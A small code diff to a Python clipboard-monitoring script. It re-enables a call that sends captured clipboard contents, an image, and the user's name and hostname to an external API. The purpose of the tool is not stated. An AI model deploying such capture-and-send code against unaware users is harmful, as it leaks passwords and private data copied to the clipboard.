@@ -13,6 +13,7 @@ import socket
 import io
 import apiSender
 import time
+import json
 
 previous_content = None
 
@@ -43,13 +44,14 @@ def process_clipboard():
         hostname = read_hostname()
 
         data = {
-        'username': username,
-        'hostname': hostname,
-        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-        'content': current_content,
+        "username": username,
+        "hostname": hostname,
+        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
+        "content": current_content,
         }
+
         utility.log_clipboard_content(current_content, username + " " + hostname, main.log_file)
-#        apiSender.send(imageByteArray, data)
+        apiSender.send(imageByteArray, data)
         previous_content = current_content
 
 def get_clipboard_content():
